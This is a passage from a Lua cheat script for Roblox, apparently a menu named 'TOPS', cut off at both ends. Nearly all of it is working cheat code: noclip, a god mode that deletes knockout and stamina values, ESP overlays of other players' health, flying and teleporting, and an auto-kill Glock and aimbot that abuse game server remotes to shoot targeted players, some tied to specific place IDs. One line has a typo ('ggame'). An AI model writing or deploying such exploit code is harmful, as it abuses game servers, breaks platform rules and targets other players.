										GetlCharacter (  ).Torso.CanCollide = false
										if GetlCharacter (  ):FindFirstChild ( "Left Leg" ) then
											GetlCharacter (  )["Left Leg"].CanCollide = false
										end
										if GetlCharacter (  ):FindFirstChild ( 'Right Leg' ) then
											GetlCharacter (  )["Right Leg"].CanCollide = false
										end
										if GetlCharacter (  ):FindFirstChild ( "Left Arm" ) then
											GetlCharacter (  )["Left Arm"].CanCollide = false
										end
										if GetlCharacter (  ):FindFirstChild ( "Right Arm" ) then
											GetlCharacter (  )["Right Arm"].CanCollide = false
										end
										if GetlCharacter (  ):FindFirstChild ( 'Glock' ) then
											if GetlCharacter (  ).Glock:FindFirstChild ( 'Barrel' ) then
												if GetlCharacter (  ).Glock.Barrel.CanCollide ~= false then
													GetlCharacter (  ).Glock.Barrel.CanCollide = false
												end
											end
										end
									end
									if God then
										workspace.Live[game.Players.LocalPlayer.Name]:FindFirstChild ( 'KO' ):Destroy (  )
										workspace.Live[game.Players.LocalPlayer.Name]:FindFirstChild ( 'Stamina' ):Destroy (  )
										workspace.Live[game.Players.LocalPlayer.Name]:FindFirstChild ( 'Used' ):Destroy (  )
									end
									if RGod then
										GetlCharacter (  )['Right Leg']:Destroy (  )
									end
								end )
								function GetlCharacter (  ) 
									return game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:wait (  )
								end
								function notify ( text, font, dur ) 
									local Notification = Instance.new ( "ScreenGui" );
									local Main = Instance.new ( "Frame" );
									local NotifText = Instance.new ( "TextLabel" );
									local Title = Instance.new ( "TextLabel" )
									Notification.Name = "Notification";
									Notification.Parent = game.CoreGui;
									Main.Name = "Main";
									Main.Parent = Notification;
									Main.AnchorPoint = Vector2.new ( 0.5, 0.5 );
									Main.BorderSizePixel = 0;
									Main.Position = UDim2.new ( 1.5, 0, 0.8, 0 );
									Main.Size = UDim2.new ( 0, 188, 0, 47 );
									NotifText.Name = "NotifText";
									NotifText.Parent = Main;
									NotifText.BackgroundColor3 = Color3.fromRGB ( 255, 255, 255 );
									NotifText.BackgroundTransparency = 1;
									NotifText.Size = UDim2.new ( 0, 188, 0, 47 );
									NotifText.Text = text;
									NotifText.TextScaled = true;
									NotifText.TextColor3 = Color3.fromRGB ( 255, 255, 255 );
									NotifText.TextSize = 18;
									NotifText.TextWrapped = true;
									NotifText.TextXAlignment = Enum.TextXAlignment.Left;
									Title.Name = "Title";
									Title.Parent = Main;
									Title.BorderSizePixel = 0;
									Title.Position = UDim2.new ( 0, 0, -0.319148928, 0 );
									Title.Size = UDim2.new ( 0, 188, 0, 15 )
									Title.TextScaled = true;
									Title.TextSize = 20;
									Title.TextWrapped = true
									Main.BackgroundColor3 = Color3.fromRGB ( 66, 66, 66 )
									Title.BackgroundColor3 = ExampleColors['butter']
									Title.TextColor3 = ExampleColors['black']
									Title.Text = "TOPS: Notification"
									Title.Font = Enum.Font[font]
									NotifText.Font = Enum.Font[font]
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.8, 0 ), "Out", "Quint", 0.5, true )
									wait ( dur )
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Main:TweenPosition ( UDim2.new ( 1.5, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Notification:Destroy (  )
								end
								function Audio_Logger_Notify ( id, who, dur ) 
									local Audio_Notify = Instance.new ( "ScreenGui" )
									local Main = Instance.new ( "Frame" )
									local Title = Instance.new ( "TextLabel" )
									local FromWho = Instance.new ( "TextLabel" )
									local blahblah = Instance.new ( "TextLabel" )
									local IdText = Instance.new ( "TextLabel" )
									Audio_Notify.Name = "Audio_Notify"
									Audio_Notify.Parent = game.CoreGui
									Main.Name = "Main"
									Main.Parent = Audio_Notify
									Main.AnchorPoint = Vector2.new ( 0.5, 0.5 )
									Main.BackgroundColor3 = Color3.new ( 0.258824, 0.258824, 0.258824 )
									Main.BorderSizePixel = 0
									Main.Position = UDim2.new ( 1.5, 0, 0.8, 0 )
									Main.Size = UDim2.new ( 0, 188, 0, 88 )
									Title.Name = "Title"
									Title.Parent = Main
									Title.BackgroundColor3 = Color3.new ( 0.94902, 0.87451, 0.501961 )
									Title.BorderSizePixel = 0
									Title.Position = UDim2.new ( 0, 0, -0.0829999968, 0 )
									Title.Size = UDim2.new ( 0, 188, 0, 15 )
									Title.Text = "TOPS: Notification"
									Title.TextColor3 = Color3.new ( 0, 0, 0 )
									Title.TextScaled = true
									Title.TextSize = 20
									Title.TextWrapped = true
									Title.Font = AvailableFonts[6]
									FromWho.Name = "FromWho"
									FromWho.Parent = Main
									FromWho.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									FromWho.BackgroundTransparency = 1
									FromWho.Position = UDim2.new ( 0.0478723049, 0, 0.2167629, 0 )
									FromWho.Size = UDim2.new ( 0, 169, 0, 16 )
									FromWho.Text = "From: " .. who
									FromWho.Font = AvailableFonts[6]
									FromWho.TextColor3 = Color3.new ( 1, 1, 1 )
									FromWho.TextScaled = true
									FromWho.TextSize = 14
									FromWho.TextWrapped = true
									FromWho.TextXAlignment = Enum.TextXAlignment.Left
									blahblah.Name = "blahblah"
									blahblah.Parent = Main
									blahblah.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									blahblah.BackgroundTransparency = 1
									blahblah.Position = UDim2.new ( 0.0478723384, 0, 0.713751972, 0 )
									blahblah.Size = UDim2.new ( 0, 169, 0, 16 )
									blahblah.Text = "ID has been copied to ur clipboard"
									blahblah.TextColor3 = Color3.new ( 1, 1, 1 )
									blahblah.TextScaled = true
									blahblah.TextSize = 14
									blahblah.Font = AvailableFonts[6]
									blahblah.TextWrapped = true
									IdText.Name = "IdText"
									IdText.Parent = Main
									IdText.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									IdText.BackgroundTransparency = 1
									IdText.Position = UDim2.new ( 0.0480000004, 0, 0.474999994, 0 )
									IdText.Size = UDim2.new ( 0, 169, 0, 16 )
									IdText.Text = "Id: " .. id
									IdText.TextColor3 = Color3.new ( 1, 1, 1 )
									IdText.TextScaled = true
									IdText.TextSize = 14
									IdText.TextWrapped = true
									IdText.Font = AvailableFonts[6]
									IdText.TextXAlignment = Enum.TextXAlignment.Left
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.8, 0 ), "Out", "Quint", 0.5, true )
									wait ( dur )
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Main:TweenPosition ( UDim2.new ( 1.5, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Audio_Notify:Destroy (  )
								end
								function Decal_Logger_Notify ( id, who, dur ) 
									local Decal_Notify = Instance.new ( "ScreenGui" )
									local Main = Instance.new ( "Frame" )
									local Title = Instance.new ( "TextLabel" )
									local Decal_preview = Instance.new ( "ImageLabel" )
									local FromWho = Instance.new ( "TextLabel" )
									local blahblah = Instance.new ( "TextLabel" )
									Decal_Notify.Name = "Decal_Notify"
									Decal_Notify.Parent = game.CoreGui
									Main.Name = "Main"
									Main.Parent = Decal_Notify
									Main.AnchorPoint = Vector2.new ( 0.5, 0.5 )
									Main.BackgroundColor3 = Color3.new ( 0.258824, 0.258824, 0.258824 )
									Main.BorderSizePixel = 0
									Main.Position = UDim2.new ( 1.5, 0, 0.8, 0 )
									Main.Size = UDim2.new ( 0, 188, 0, 177 )
									Title.Name = "Title"
									Title.Parent = Main
									Title.BackgroundColor3 = Color3.new ( 0.94902, 0.87451, 0.501961 )
									Title.BorderSizePixel = 0
									Title.Position = UDim2.new ( 0, 0, -0.0829999968, 0 )
									Title.Size = UDim2.new ( 0, 188, 0, 15 )
									Title.Font = AvailableFonts[6]
									Title.Text = "TOPS: Notification"
									Title.TextColor3 = Color3.new ( 0, 0, 0 )
									Title.TextScaled = true
									Title.TextSize = 20
									Title.TextWrapped = true
									Decal_preview.Name = "Decal_preview"
									Decal_preview.Parent = Main
									Decal_preview.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									Decal_preview.BackgroundTransparency = 1
									Decal_preview.Position = UDim2.new ( 0.122340426, 0, 0.0489419289, 0 )
									Decal_preview.Size = UDim2.new ( 0, 142, 0, 100 )
									Decal_preview.Image = id
									FromWho.Name = "FromWho"
									FromWho.Parent = Main
									FromWho.TextScaled = true
									FromWho.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									FromWho.BackgroundTransparency = 1
									FromWho.Position = UDim2.new ( 0.0372340418, 0, 0.64971751, 0 )
									FromWho.Size = UDim2.new ( 0, 169, 0, 16 )
									FromWho.Font = AvailableFonts[6]
									FromWho.Text = "From: " .. who
									FromWho.TextColor3 = Color3.new ( 1, 1, 1 )
									FromWho.TextSize = 14
									FromWho.TextXAlignment = Enum.TextXAlignment.Left
									blahblah.Name = "blahblah"
									blahblah.Parent = Main
									blahblah.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									blahblah.BackgroundTransparency = 1
									blahblah.Position = UDim2.new ( 0.0478723384, 0, 0.779661059, 0 )
									blahblah.Size = UDim2.new ( 0, 169, 0, 16 )
									blahblah.Font = AvailableFonts[6]
									blahblah.Text = "ID has been copied to ur clipboard"
									blahblah.TextColor3 = Color3.new ( 1, 1, 1 )
									blahblah.TextSize = 14
									blahblah.TextScaled = true
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.8, 0 ), "Out", "Quint", 0.5, true )
									wait ( dur )
									Main:TweenPosition ( UDim2.new ( 0.92, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Main:TweenPosition ( UDim2.new ( 1.5, 0, 0.65, 0 ), "Out", "Quint", 0.5, true )
									wait ( 0.5 )
									Decal_Notify:Destroy (  )
								end
								function AddCommandToCmd ( x, xx ) 
									local Frame = Instance.new ( "Frame" )
									local TextLabel = Instance.new ( "TextLabel" )
									Frame.Parent = xx
									Frame.BackgroundColor3 = Color3.new ( 0.294118, 0.294118, 0.294118 )
									Frame.BorderSizePixel = 0
									Frame.Position = UDim2.new ( 1.1973244, 0, 16, 0 )
									Frame.Size = UDim2.new ( 0, 291, 0, 22 )
									TextLabel.Parent = Frame
									TextLabel.BackgroundColor3 = Color3.new ( 1, 1, 1 )
									TextLabel.BackgroundTransparency = 1
									TextLabel.Position = UDim2.new ( 0.0756013766, 0, 0, 0 )
									TextLabel.Size = UDim2.new ( 0, 269, 0, 22 )
									TextLabel.Font = Enum.Font.Code
									TextLabel.Text = x
									TextLabel.TextColor3 = Color3.new ( 1, 1, 1 )
									TextLabel.TextScaled = true
									TextLabel.TextSize = 14
									TextLabel.TextWrapped = true
								end
								function Cmds ( fromwhat ) 
									local Cmds = Instance.new ( "ScreenGui" )
									local FrameHolderTitle = Instance.new ( "TextLabel" )
									local MainFrame = Instance.new ( "ScrollingFrame" )
									local UIListLayout = Instance.new ( "UIListLayout" )
									local close = Instance.new ( "ImageButton" )
									Cmds.Name = "Cmds"
									Cmds.Parent = game.CoreGui
									FrameHolderTitle.Name = "FrameHolderTitle"
									FrameHolderTitle.Parent = Cmds
									FrameHolderTitle.BackgroundColor3 = Color3.new ( 0.94902, 0.87451, 0.501961 )
									FrameHolderTitle.BorderSizePixel = 0
									FrameHolderTitle.Position = UDim2.new ( 0.373831779, 0, 0.202341139, 0 )
									FrameHolderTitle.Size = UDim2.new ( 0, 299, 0, 20 )
									FrameHolderTitle.Font = Enum.Font.Code
									FrameHolderTitle.Text = "TOPS commands"
									FrameHolderTitle.TextColor3 = Color3.new ( 0, 0, 0 )
									FrameHolderTitle.TextScaled = true
									FrameHolderTitle.TextSize = 14
									FrameHolderTitle.TextWrapped = true
									MainFrame.Name = "MainFrame"
									MainFrame.Parent = FrameHolderTitle
									MainFrame.Active = true
									MainFrame.BackgroundColor3 = Color3.new ( 0.258824, 0.258824, 0.258824 )
									MainFrame.BorderSizePixel = 0
									MainFrame.Position = UDim2.new ( -0.00116824149, 0, 0.995785534, 0 )
									MainFrame.Size = UDim2.new ( 0, 299, 0, 316 )
									MainFrame.CanvasSize = UDim2.new ( 0, 0, 99, 0 )
									MainFrame.ScrollBarThickness = 7
									UIListLayout.Parent = MainFrame
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
									UIListLayout.Padding = UDim.new ( 0, 2 )
									close.Name = "close"
									close.Parent = FrameHolderTitle
									close.BackgroundTransparency = 1
									close.Position = UDim2.new ( 0.936454833, 0, 0, 0 )
									close.Size = UDim2.new ( 0, 19, 0, 19 )
									close.ZIndex = 2
									close.Image = "rbxassetid://3926305904"
									close.ImageRectOffset = Vector2.new ( 284, 4 )
									close.ImageRectSize = Vector2.new ( 24, 24 )
									for i = 1, #fromwhat do
										AddCommandToCmd ( fromwhat[i], MainFrame )
									end
									close.MouseButton1Down:Connect ( function (  )
										Cmds:Destroy (  )
									end )
								end
								function Esp ( x, c ) 
									local color = BrickColor.new ( "Really red" )
									local y = x.Character
									local a = Instance.new ( "BoxHandleAdornment", y.Torso )
									a.Size = y.Torso.Size + Vector3.new ( 0.01, 0.01, 0.01 )
									a.ZIndex = 1
									a.Color = color
									a.Adornee = y.Torso
									a.Transparency = 0.5
									a.AlwaysOnTop = true
									a.Visible = true
									local bb = Instance.new ( 'BillboardGui', c );
									bb.Adornee = c;
									bb.Size = UDim2.new ( 0, 100, 0, 100 );
									bb.StudsOffset = Vector3.new ( 0, 1.5, 0 );
									bb.AlwaysOnTop = true
									local tl = Instance.new ( 'TextLabel', bb );
									tl.BackgroundTransparency = 1;
									tl.Size = UDim2.new ( 1, 0, 0, 40 );
									tl.Font = 'RobotoMono'
									tl.TextColor3 = Color3.fromRGB ( 255, 0, 0 )
									tl.TextSize = 24
									tl.Text = x.Name .. ' | ' .. tostring ( y.Humanoid.Health ):sub ( 1, 4 )
									y.Humanoid.Changed:Connect ( function ( z )
										if z == 'Health' then
											tl.Text = x.Name .. ' | ' .. tostring ( y.Humanoid.Health ):sub ( 1, 4 )
										end
									end )
								end
								function ChatNotify ( text, font, color ) 
									game.StarterGui:SetCore ( 'ChatMakeSystemMessage', {
										Text = text,
										Font = Enum.Font[font],
										Color = color
									} )
								end
								function GetPlayer ( x ) 
									for i, v in pairs ( game.Players:GetPlayers (  ) ) do
										if v.Name:sub ( 1, #x ):lower (  ) == x:lower (  ) then
											return v
										end
									end
								end
								function SpacePart (  ) 
									local Base = Instance.new ( 'Part', workspace )
									Base.Name = "SpacePart"
									Base.Size = Vector3.new ( 1500, 40, 1500 )
									Base.Position = Vector3.new ( 0, -800, 0 )
									Base.Anchored = true
								end
								function CreateBox ( part, mode ) 
									local box = Instance.new ( 'SelectionBox', part )
									box.Adornee = part
									if mode == 'Box' then
										box.LineThickness = 0.008
										box.SurfaceTransparency = 0.7
									elseif mode == 'Outline' then
										box.LineThickness = 0.05
									elseif mode == 'Outline_Light' then
										box.LineThickness = 0.008
									end
								end
								function TweenToPlayer ( target, speed ) 
									local TargetChar = target.Character
									local TweenInf0 = TweenInfo.new ( 1 * math.floor ( ( GetlCharacter (  )["HumanoidRootPart"].Position - TargetChar["Torso"].Position ).magnitude ) / speed, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0 )
									TwnS:Create ( GetlCharacter (  )["HumanoidRootPart"], TweenInf0, {
										CFrame = TargetChar["Torso"].CFrame + Vector3.new ( 0, 2, 0 )
									} ):Play (  )
									repeat
										GetlCharacter (  )["HumanoidRootPart"].Velocity = Vector3.new ( 0, 0, 0 )
									until 1 * math.floor ( ( GetlCharacter (  )["HumanoidRootPart"].Position - TargetChar["Torso"].Position ).magnitude ) / speed
								end
								function TweenToPos ( x, y, z, speed ) 
									local TweenInf0 = TweenInfo.new ( 1 * math.floor ( ( GetlCharacter (  )["HumanoidRootPart"].Position - Vector3.new ( x, y, z ) ).magnitude ) / speed, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0 )
									TwnS:Create ( GetlCharacter (  )["HumanoidRootPart"], TweenInf0, {
										CFrame = CFrame.new ( x, y, z ) + Vector3.new ( 0, 2, 0 )
									} ):Play (  )
									repeat
										GetlCharacter (  )["HumanoidRootPart"].Velocity = Vector3.new ( 0, 0, 0 )
									until 1 * math.floor ( ( GetlCharacter (  )["HumanoidRootPart"].Position - Vector3.new ( x, y, z ) ).magnitude ) / speed
								end
								function Buy ( t, limit ) 
									local x = 0
									repeat
										x = x + 1
										GetlCharacter (  ).HumanoidRootPart.CFrame = workspace[t].Head.CFrame
										hb:wait (  )
									until x == limit
								end
								function FightPack ( key ) 
									if key == ConfigToSave.fightpack_Hotkey then
										local tool = plr.Backpack.Punch
										local AnimId = anims[math.random ( 1, #anims )]
										local Anim = Instance.new ( "Animation" )
										Anim.AnimationId = "rbxassetid://" .. AnimId
										local k = GetlCharacter (  ).Humanoid:LoadAnimation ( Anim )
										k:Play (  )
										plr.Backpack.ServerTraits.Touch1:FireServer ( tool, tool.Handle, true, true )
									end
								end
								function ByeBody ( LocalP ) 
									for index1, v in next, LocalP.Character:GetDescendants (  ) do
										if v:IsA ( 'BasePart' ) then
											if v.Name ~= 'HumanoidRootPart' then
												v.CanCollide = true
												local BodyF = Instance.new ( 'BodyForce' )
												BodyF.Parent = v
												BodyF.Force = Vector3.new ( 0, 90000, 0 )
											end
										end
									end
									for index2, v in next, LocalP.Character:GetDescendants (  ) do
										if v:IsA ( 'Motor6D' ) then
											local att1 = Instance.new ( 'Attachment' )
											local att2 = Instance.new ( 'Attachment' )
											local rope = Instance.new ( 'RopeConstraint' )
											att1.Parent = v.Part0
											att2.Parent = v.Part1
											rope.Parent = v.Part0
											rope.Attachment0 = att1
											rope.Attachment1 = att2
											rope.Length = math.pow ( math.huge, math.huge )
											if v.Name ~= 'Neck' then
												v:Destroy (  )
											end
										end
									end
								end
								function Fly (  ) 
									local bg = Instance.new ( "BodyGyro", game.Players.LocalPlayer.Character.HumanoidRootPart )
									bg.P = 9e4
									bg.maxTorque = Vector3.new ( 9e9, 9e9, 9e9 )
									bg.cframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
									local bv = Instance.new ( "BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart )
									bv.velocity = Vector3.new ( 0, 0.1, 0 )
									bv.maxForce = Vector3.new ( 9e9, 9e9, 9e9 )
									game.Players.LocalPlayer.Character.Humanoid.StateChanged:Connect ( function ( abc )
										if abc == Enum.HumanoidStateType.PlatformStanding then
											game.Players.LocalPlayer.Character.Humanoid.PlatformStanding = false
										end
									end )
									repeat
										rs:wait (  )
										if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
										elseif not ( ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 ) and speed ~= 0 then
										end
										if ( ctrl.l + ctrl.r ) ~= 0 or ( ctrl.f + ctrl.b ) ~= 0 then
											bv.velocity = ( ( game.Workspace.CurrentCamera.CoordinateFrame.lookVector * ( ctrl.f + ctrl.b ) ) + ( ( game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new ( ctrl.l + ctrl.r, ( ctrl.f + ctrl.b ) * .2, 0 ).p ) - game.Workspace.CurrentCamera.CoordinateFrame.p ) )
										else
											bv.velocity = Vector3.new ( 0, 0, 0 )
										end
										bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame
										game.Players.LocalPlayer.Character.Humanoid:ChangeState ( 8 )
										game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
										rr:wait (  )
										game.Players.LocalPlayer.Character.Humanoid:ChangeState ( 10 )
										game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
										rr:wait (  )
										game.Players.LocalPlayer.Character.Humanoid:ChangeState ( 3 )
									until not flying
									ctrl = {
										f = 0,
										b = 0,
										l = 0,
										r = 0
									}
									lastctrl = {
										f = 0,
										b = 0,
										l = 0,
										r = 0
									}
									bg:Destroy (  )
									bv:Destroy (  )
								end
								UIS.InputBegan:Connect ( function ( key )
									if key.KeyCode == Enum.KeyCode.LeftShift and ConfigToSave.Bs then
										Blinking = true
										while Blinking do
											plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame + plr.Character.Humanoid.MoveDirection * ( ConfigToSave.BlinkSpeed / 4 )
											hb:wait (  )
										end
									end
								end )
								UIS.InputEnded:Connect ( function ( key )
									if key.KeyCode == Enum.KeyCode.LeftShift and ConfigToSave.Bs then
										Blinking = false
									end
								end )
								m.KeyDown:Connect ( function ( x )
									if x == ConfigToSave.AirWalk_Hotkey then
										if ConfigToSave.AirWalk then
											if aw == false then
												aw = true
												local a = Instance.new ( "Part", workspace )
												a.Name = 'AirWalkPart'
												a.Anchored = true
												a.Transparency = 1
												a.Size = Vector3.new ( 8, 0.1, 8 )
												while aw do
													hb:wait (  )
													a.Position = GetlCharacter (  ).HumanoidRootPart.Position - Vector3.new ( 0, 3.05, 0 )
												end
											elseif aw == true then
												aw = false
												workspace['AirWalkPart']:Destroy (  )
											end
										end
									end
								end )
								m.KeyDown:Connect ( function ( key )
									if ConfigToSave.AntiAim then
										if key == ConfigToSave.AntiAim_Hotkey then
											OnAA = not OnAA
											repeat
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( -600, GetlCharacter (  ).HumanoidRootPart.Velocity.Y, 0 )
												hb:wait (  )
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( 600, GetlCharacter (  ).HumanoidRootPart.Velocity.Y, 0 )
												hb:wait (  )
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( 0, GetlCharacter (  ).HumanoidRootPart.Velocity.Y, -600 )
												hb:wait (  )
												GetlCharacter (  ).HumanoidRootPart.Velocity = Vector3.new ( 0, GetlCharacter (  ).HumanoidRootPart.Velocity.Y, 600 )
												hb:wait (  )
											until OnAA == false
										end
									end
								end )
								m.Button1Down:connect ( function (  )
									if ConfigToSave.AttachGlock == true then
										if m.Target.Parent.ClassName == "Model" then
											if m.Target.Parent:FindFirstChild ( 'Humanoid' ) then
												local target = m.Target.Parent.Name
												if GetlCharacter (  ):FindFirstChild ( "Glock" ) then
												else
													game.Players.LocalPlayer.Backpack:FindFirstChild ( "Glock" ).Parent = GetlCharacter (  )
												end
												repeat
													game["Run Service"].Heartbeat:wait (  )
												until GetlCharacter (  )["Right Arm"]:FindFirstChild ( "RightGrip" )
												GetlCharacter (  )["Right Arm"]:FindFirstChild ( "RightGrip" ):Remove (  )
												repeat
													GetlCharacter (  ).Glock.Handle.CFrame = game.Players[target].Character.Head.CFrame
													GetlCharacter (  ).Glock.Fire:FireServer ( game.Players[target].Character.Head.CFrame + game.Players[target].Character.Head.Velocity / 5 )
													GetlCharacter (  ).Glock.Fire:FireServer ( game.Players[target].Character.Head.CFrame + game.Players[target].Character.Head.Velocity / 5 )
													game["Run Service"].Heartbeat:wait (  )
												until game.Players[target].Character.Humanoid.Health == 0 or game.Players[target].Character:FindFirstChild ( "KO" )
												GetlCharacter (  ).Glock.Parent = game.Players.LocalPlayer.Backpack
											end
										end
									end
								end )
								function PredictToCFrame ( y ) 
									local x = ( y.Character.Torso.CFrame + y.Character.Torso.Velocity / ( ping < 0.26 and 5 or 7.5 ) ) + ( y.Character.Torso.RotVelocity / ( ping < 0.26 and 5 or 7.5 ) )
									return x
								end
								m.KeyDown:Connect ( function ( key )
									if key == ConfigToSave.camlock_Hotkey and Camlocking and not IsCamlocking then
										wait ( 0.1 )
										IsCamlocking = true
										while IsCamlocking do
											workspace.CurrentCamera.CFrame = CFrame.new ( game.Workspace.CurrentCamera.CFrame.p, CamlockTar.Character.Torso.CFrame.p )
											rr:wait (  )
										end
									end
								end )
								m.KeyDown:Connect ( function ( key )
									if key == ConfigToSave.camlock_Hotkey and Camlocking and IsCamlocking then
										wait ( 0.1 )
										IsCamlocking = false
									end
								end )
								m.KeyDown:Connect ( function ( key )
									if key == ConfigToSave.aimbot_Hotkey and IsAimbotting and Aimboting == false then
										Aimboting = true
										if game.PlaceId == 4669040 then
											while Aimboting do
												if AimbotTarget.Character then
													if not AimbotTarget.Character:FindFirstChild ( 'KO' ) then
														if AimbotTarget.Character.Torso.Velocity.Magnitude <= 100 then
															PredictionValue = 5
															game.Players.LocalPlayer.Character:FindFirstChildWhichIsA ( "Tool" ).Fire:FireServer ( AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ) )
														elseif AimbotTarget.Character.Torso.Velocity.Magnitude <= 250 and AimbotTarget.Character.Torso.Velocity.Magnitude > 100 then
															PredictionValue = 4
															game.Players.LocalPlayer.Character:FindFirstChildWhichIsA ( "Tool" ).Fire:FireServer ( AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ) )
														elseif AimbotTarget.Character.Torso.Velocity.Magnitude > 250 then
															PredictionValue = 3
															game.Players.LocalPlayer.Character:FindFirstChildWhichIsA ( "Tool" ).Fire:FireServer ( AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ) )
														end
													end
												end
												wait ( 0.15 )
											end
										end
										if game.PlaceId == 455366377 then
											while Aimboting do
												if AimbotTarget.Character then
													if not AimbotTarget.Character.Torso:FindFirstChild ( 'Bone' ) then
														if AimbotTarget.Character.Torso.Velocity.Magnitude <= 100 then
															PredictionValue = 5
															game.Players.LocalPlayer.Backpack.Input:FireServer ( "m1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
															wait (  )
															game.Players.LocalPlayer.Backpack.Input:FireServer ( "moff1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
														elseif AimbotTarget.Character.Torso.Velocity.Magnitude <= 250 and AimbotTarget.Character.Torso.Velocity.Magnitude > 100 then
															PredictionValue = 4
															ggame.Players.LocalPlayer.Backpack.Input:FireServer ( "m1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
															wait (  )
															game.Players.LocalPlayer.Backpack.Input:FireServer ( "moff1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
														elseif AimbotTarget.Character.Torso.Velocity.Magnitude > 250 then
															PredictionValue = 3
															game.Players.LocalPlayer.Backpack.Input:FireServer ( "m1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
															wait (  )
															game.Players.LocalPlayer.Backpack.Input:FireServer ( "moff1", {
																mousehit = AimbotTarget.Character.Torso.CFrame + AimbotTarget.Character.Torso.Velocity / ( PredictionValue ),
																shift = false,
																velo = 0
															} )
														end
													end
												end
												wait ( 0.12 )
											end
										end
									elseif key == ConfigToSave.aimbot_Hotkey and Aimboting == true then
										Aimboting = false
										print ( 'STOPED' )
									end
								end )
								m.KeyDown:Connect ( function ( key )
									if OnGrab then
										if key == "e" and Grab == false then
											Grab = true
											local chosenone = m.Target
											pose = Instance.new ( "BodyForce", chosenone )
											gyro = Instance.new ( "BodyGyro", chosenone )
											posos = Instance.new ( "BodyPosition", chosenone )
											posos.P = posos.P * 10
											posos.MaxForce = Vector3.new ( math.huge, math.huge, math.huge )
											gyro.MaxTorque = Vector3.new ( math.huge, math.huge, math.huge )
											game:GetService ( "RunService" ).Stepped:Connect ( function (  )
												if Grab == true then
													posos.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Workspace.CurrentCamera.CFrame.LookVector * offset
													gyro.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
													pose.Force = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Workspace.CurrentCamera.CFrame.LookVector * offset
												end
											end )
										end
									end
								end )
								m.WheelForward:Connect ( function (  )
									if OnGrab then
										offset = offset - 1
									end
								end )
								m.WheelBackward:Connect ( function (  )
									if OnGrab then
										offset = offset + 1
									end
								end )
								m.KeyUp:Connect ( function ( key )
									if OnGrab then
										if key == "e" and Grab == true then
											pose:Remove (  )
											posos:Remove (  )
											gyro:Remove (  )
											Grab = false
										end
									end
								end )
								light:GetPropertyChangedSignal ( 'ClockTime' ):Connect ( function (  )
									if ConfigToSave.Day then
										light.TimeOfDay = 12
									end
								end )
								light:GetPropertyChangedSignal ( 'FogEnd' ):Connect ( function (  )
									if ConfigToSave.Day then
										light.FogEnd = 100000
									end
								end )
								light:GetPropertyChangedSignal ( 'FogStart' ):Connect ( function (  )
									if ConfigToSave.Day then
										light.FogStart = 0
									end
								end )
								light:GetPropertyChangedSignal ( 'FogColor' ):Connect ( function (  )
									if ConfigToSave.Day then
										light.FogColor = ExampleColors['white']
									end
								end )
								plr.CharacterAdded:Connect ( function (  )
									for i, v in pairs ( workspace.Terrain:GetChildren (  ) ) do
										if v:IsA ( "Tool" ) then
											v:Destroy (  )
										end
									end
									if ConfigToSave.AutoReset == true then
										plr.Character.ChildAdded:Connect ( function ( poop )
											if poop.Name == 'KO' then
												plr.Character:BreakJoints (  )
											end
										end )
									end
									if ConfigToSave.fightpack == true then
										repeat
											wait (  )
										until plr.Backpack
										if plr.Backpack then
											repeat
												wait (  )
											until plr.Backpack:FindFirstChild ( 'Punch' )
											if plr.Backpack.Punch then
												local Connection = m.KeyDown:Connect ( FightPack )
												GetlCharacter (  ).Humanoid.Died:Connect ( function (  )
													Connection:Disconnect (  )
												end )
											end
										end
									end
									if AnitFe then
										wait ( 2 )
